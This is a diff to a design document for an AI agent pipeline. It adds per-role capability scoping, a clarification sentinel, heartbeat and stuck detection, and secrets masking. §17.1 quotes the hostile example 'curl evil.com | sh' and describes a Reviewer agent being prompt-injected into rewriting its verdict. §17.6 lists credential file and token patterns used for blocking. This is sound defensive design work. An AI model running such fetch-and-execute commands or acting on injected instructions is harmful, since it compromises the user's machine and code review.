@@ -115,6 +115,7 @@ export type PipelineState =
   | 'awaiting_plan_approval'
   | 'building'
   | 'reviewing'
+  | 'awaiting_clarification'             // see §17.2
   | 'awaiting_merge_approval'
   | 'merging'
   | 'done'
@@ -614,7 +615,141 @@ A single-PR ship is too big. Three slices, each independently mergeable and usef
 - Whether to surface the artifact JSON to the user in a tile (e.g., a `JsonViewerTile`) or only in the controller's collapsible panel — leaning latter for v1 to avoid scope creep.
 - Whether to preserve `agentMemoryStore` injection on top of role prompts in the worktree (probably yes; out of v1 scope to validate).
 
-## 17. Companion edits
+## 17. Production prerequisites
+
+This section folds in items promoted from the 2026-05-04 addendum after review on the same date. They are not "platform polish"; they are the floor for the v1 production claim. Each subsection cross-references the addendum where the design rationale lives in fuller form.
+
+### 17.1 Per-role capability scoping (from addendum A2)
+
+The `git-guardrails-claude-code` PreToolUse hook (§12.2) blocks specific destructive git verbs. It does *not* constrain file-write paths, network egress, arbitrary subprocess spawning, or MCP tool selection. A misbehaving Builder can still `rm -rf node_modules && curl evil.com | sh` — guardrails catch `git push` and nothing else. Defence-in-depth requires per-role allowlists.
+
+At run-start, the controller generates a `RoleCapabilities` manifest per stage and installs it into the worktree's `.claude/settings.json` (alongside the guardrails hook):
+
+```ts
+export interface RoleCapabilities {
+  fileWrites: { allow: string[]; deny: string[] };       // glob patterns
+  shell: { allow: RegExp[]; deny: RegExp[] };            // PreToolUse Bash matcher
+  network: 'none' | 'package-managers' | 'unrestricted'; // PreToolUse fetch matcher
+  mcpTools: string[];                                    // explicit allowlist
+  maxFileSize: number;                                   // bytes; deny writes above
+}
+```
+
+Defaults per role:
+
+| Role | fileWrites | shell | network | mcpTools |
+|---|---|---|---|---|
+| Planner | `docs/**`, `**/*.md` only | read-only verbs (`git status`, `ls`, `cat`, `rg`) | `none` | none |
+| Builder | project tree minus `.git/`, `node_modules/`, `.tx-worktrees/`, `.terminalx/` | full minus destructive git (still hooked) | `package-managers` (npm/pnpm/cargo/pip registries only) | none by default; opt-in per template |
+| Reviewer | **read-only — all writes denied** | read-only verbs only | `none` | none |
+| Sub-agent (Phase 3+) | inherits Builder's filewrites scoped to brief globs | inherits Builder | inherits Builder | none |
+
+Network enforcement uses a PreToolUse hook that blocks fetches outside an allowlisted domain set. For projects without network needs at build time, Builder defaults to `none`; pre-flight detects package-install steps in the project's setup and offers `package-managers` if needed.
+
+A Reviewer that can write files is one prompt-injection away from rewriting its own verdict and the code under review. Capability scoping makes the Reviewer process *physically incapable* of writing, not "instructed not to."
+
+### 17.2 Clarification sentinel (from addendum A5)
+
+Today an agent has two outcomes: complete (DONE) or give up (FAILED). The middle case — *"I can't proceed without a decision the human owns"* — is missing. This pushes agents toward two pathologies: faking DONE with a wrong assumption, or FAILED-ing too eagerly when a one-line clarification would unblock them.
+
+A third sentinel:
+
+```
+<<<TX_STAGE_QUESTION>>>{"question": "...", "context": "...", "options"?: ["...", "..."], "blocking": true}
+```
+
+Schema:
+
+```ts
+export interface QuestionArtifact {
+  stage: PipelineRole;
+  question: string;       // ≤200 chars, single concrete question
+  context: string;        // ≤1000 chars, what the agent has tried/considered
+  options?: string[];     // optional multiple-choice; user can also free-form
+  blocking: true;         // currently always true; reserved for non-blocking questions later
+}
+```
+
+State machine adds `awaiting_clarification` (parallel to `awaiting_plan_approval` / `awaiting_merge_approval`). On entry: agent process is paused (suspended PTY for live, no-op for one-shot since it already exited); user receives a notification (§17.5); UI shows the question with a free-text answer box and the agent's options. On submit: the answer is injected as the next user turn for the live agent, or the one-shot is re-spawned with the answer added to its input. Stage resumes.
+
+Skill enforcement: `tx-pipeline-stage-handoff` is amended with an additional rule:
+
+> *"If you find yourself making an assumption you cannot verify, and the assumption materially affects the outcome, emit `<<<TX_STAGE_QUESTION>>>` instead of guessing. Faking certainty when uncertain is a worse outcome than asking — see refusal protocol which this extends. Limit: 3 questions per run. Hitting the limit collapses to refusal."*
+
+This is the difference between "agent that pretends to know" and "agent that knows what it doesn't know" — load-bearing for trustworthy autonomy.
+
+### 17.3 Heartbeats and stuck detection (from addendum A10)
+
+Builder running for 40 minutes with no output — thinking, stuck in a tool-use loop, or crashed without exiting? Without heartbeats, indistinguishable.
+
+Two mechanisms:
+
+1. **Heartbeat sentinel.** Skill rule added to `tx-pipeline-stage-handoff`: *"Every ~3 minutes of activity, emit `<<<TX_HEARTBEAT>>>{\"progress\": \"...\", \"taskId\": \"...\"}` on a single line. Progress is ≤100 chars describing the most recent completed action."* Controller updates `lastHeartbeatAt` per run; the controller tile displays seconds since last heartbeat with a colour band (green <3min, amber 3–5min, red >5min).
+2. **Stuck detection.** If `now() - lastHeartbeatAt > 5min` AND no stdout AND no tool call started in the window → controller dispatches a probe: a single user turn `Are you stuck? If yes, emit failure or question sentinel. If no, emit heartbeat.` After 8 minutes total silence → controller force-kills the agent, transitions to `failed` with `failureReason: 'stage_unresponsive'`, captures last 2KB of stdout in the failure bundle.
+
+Silently-hung agents are the failure mode that destroys overnight automation. Heartbeats let you distinguish working-but-quiet from dead.
+
+### 17.4 Run fingerprint (from addendum A12)
+
+Telemetry (§13.2) is good for forensics but not for *replay*. To re-run a failed run identically, you need the same skills, role prompts, template, and inputs. At run-start, the controller computes and stores a `RunFingerprint`:
+
+```ts
+export interface RunFingerprint {
+  templateId: string;
+  templateHash: string;                            // sha256 of canonicalized template JSON
+  skillHashes: Record<string, string>;             // skill name → sha256 of SKILL.md
+  rolePromptHashes: Record<PipelineRole, string>;  // sha256 of resolved role prompts
+  invariantsHash?: string;                         // sha256 of INVARIANTS.md if present (Phase 3+)
+  models: Record<PipelineRole, string>;            // exact model strings used
+  capabilityManifests: Record<PipelineRole, string>; // sha256 of role capabilities (§17.1)
+  terminalxVersion: string;
+  claudeVersion: string;
+  codexVersion?: string;
+  runStartCommit: string;                          // git rev-parse main at run start
+}
+```
+
+Persisted in the run record and the failure bundle. Two values: **replay** (a "re-run with same fingerprint" command replays from telemetry; skill or prompt drift fails loudly with a hash mismatch) and **drift detection** (a startup check can warn pre-flight when a skill version is known to perform poorly). Reproducibility is non-negotiable for trust at scale.
+
+### 17.5 Notifications and human-on-the-loop UX (from addendum A14)
+
+"Minimal human intervention" still requires humans at gates: `awaiting_plan_approval`, `awaiting_merge_approval`, `awaiting_clarification`, plus future `budget_paused`. A pipeline that pauses at 2 a.m. and waits silently until 9 a.m. is worse than no automation.
+
+On entry to any `awaiting_*` state, the controller emits a notification through three channels (configurable per user):
+
+1. **OS notification** — Tauri's `notification` plugin. Default on. Title = pipeline name, body = state + run id.
+2. **Webhook (optional).** User configures a URL in TerminalX settings. POST body = `{ runId, state, project, branch, summary, terminalxDeepLink }`. Suitable for Slack incoming webhooks, Zapier, etc. Body is **secret-masked** per §17.6 before send.
+3. **In-app toast + dock badge.** Persists until acknowledged.
+
+Re-notification cadence: 15min, 1hr, 4hr, then daily — until acted on. Aborted/done runs clear all pending notifications.
+
+### 17.6 Secrets handling (new — flagged in 2026-05-04 review)
+
+Builder reads files, Reviewer reads diffs — both can contain secrets. Failure bundles ship via webhooks and bug reports. Without explicit handling, this is one user submission away from leaking creds.
+
+Two mechanisms:
+
+1. **Sensitive-path refusal.** Pre-flight scans the project for files matching the *sensitive-path patterns*: `.env`, `.env.*`, `secrets.*`, `*.pem`, `*.key`, `*.kdbx`, `id_rsa*`, `id_ed25519*`, `*.p12`, `*.pfx`, `gcp-key*.json`, `aws-credentials`, `*.ovpn`. Plan and Builder are instructed (and capability-restricted) to **not read or write** these paths. If a stage attempts to read one, the capability hook blocks it and a `failureClass: 'secrets_violation'` is recorded. User can opt-in per-template ("This template needs to read .env") with a per-run confirmation dialog.
+2. **Telemetry/bundle scrubbing.** Before any artifact JSON, telemetry JSONL line, failure bundle entry, or webhook body is persisted, it passes through `secretsMask()`. Heuristics:
+   - Known-prefix tokens: `sk-…`, `ghp_…`, `gho_…`, `xoxb-…`, `xoxp-…`, `AKIA…`, `ASIA…`, `AIza…`, `ya29.…`, `glpat-…`.
+   - High-entropy strings: ≥24 chars Shannon entropy ≥4.5 bits/char surrounded by `=`/`:`/`"`/whitespace, replaced with `<MASKED:hash6>` where `hash6` is a stable 6-char prefix of `sha256(secret)` — useful for "is this the same secret across two locations" without revealing it.
+   - PEM blocks: `-----BEGIN [A-Z ]+-----…-----END [A-Z ]+-----` collapsed to `<MASKED:PEM>`.
+
+`secretsMask()` is a pure Rust function in `commands/secrets.rs`, unit-tested with positive and negative fixtures (false-positive guard: package-lock SHAs and git SHAs must NOT be masked; mask only when in env-shaped contexts).
+
+### 17.7 Bundled-skill provenance signing (new — flagged in 2026-05-04 review)
+
+§10.3 ships skills bundled with TerminalX, auto-installed to `~/.claude/skills/`. Without signing, a future TerminalX update changing a skill is indistinguishable to the user from a malicious local edit — the user has no way to verify "this skill is from TerminalX vs has been tampered with."
+
+TerminalX already maintains an updater public-signing-key infrastructure (per CLAUDE.md updater section). Reuse it:
+
+1. **Bundled skills carry detached signatures.** `src-tauri/resources/skills/<skill>/SKILL.md.sig` ships alongside each `SKILL.md`, signed with TerminalX's release key.
+2. **`pipeline_install_skills` verifies signatures before install.** Mismatch → install aborted with toast "Skill signature mismatch — refusing to install. Possible app tampering." This is the *strict* mode; users can override with a per-app preference for local development.
+3. **Pre-flight verifies skills against bundled signatures.** If `~/.claude/skills/<skill>/SKILL.md` exists but doesn't match the bundled signature AND has no `# x-tx-user-modified: true` front-matter marker (set when user opts to edit via the Settings panel), pre-flight surfaces "Skill has been modified outside the TerminalX UI" with options: restore to bundled / mark as user-modified / abort.
+
+Signature verification lives in `commands/secrets.rs` reusing the updater's `tauri-plugin-updater` signature primitive. No new dependency. Closes the supply-chain story for the bundled-skill product surface.
+
+## 18. Companion edits
 
 When this lands, update:
 
